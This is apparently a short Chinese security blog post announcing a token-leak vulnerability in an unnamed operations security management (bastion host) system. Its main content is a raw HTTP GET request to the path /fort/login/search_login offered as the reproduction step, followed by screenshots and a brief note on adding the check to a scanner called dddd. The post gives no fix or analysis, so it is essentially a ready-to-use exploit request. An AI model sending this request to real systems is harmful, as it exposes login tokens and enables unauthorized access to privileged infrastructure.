#  某运维安全管理系统存在token泄露漏洞  
安全艺术
                    安全艺术  安全艺术   2026-03-06 09:00  
  
# 1. 漏洞复现  
```
GET /fort/login/search_login HTTP/1.1Host: Cache-Control: max-age=0Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mEJuibtxKvMUuHTL090vl4ecjWWZZPJt9OYu3uibaMPzhooh70NLkibkf6N6iaYZ9kjxcltduZ9q7BaEuVTNbVQIBZzlfMeHjw0TGFzIjXsrFw/640?wx_fmt=png&from=appmsg "")  
# 2. dddd集成  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6mEJuibtxKvNhI15ReZfibOKbv2g7U1EGv1HWiczYxlIgsexiafEvdb6YkEzWiagcnmkLbBkiaeTM64GB0NYB3qics4Fv0posVY70Y3L6QywV9hAkU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/6mEJuibtxKvPBcW6hHBZwEDIpyG28gxicl8mEFXHEH7faC6tl7pBfSyJmXlgNqv3DTFuDYeeDbXDDbzq8tOXH1nGQbwKH5oRKafVDJBwGBFTA/640?wx_fmt=jpeg&from=appmsg "")  
  
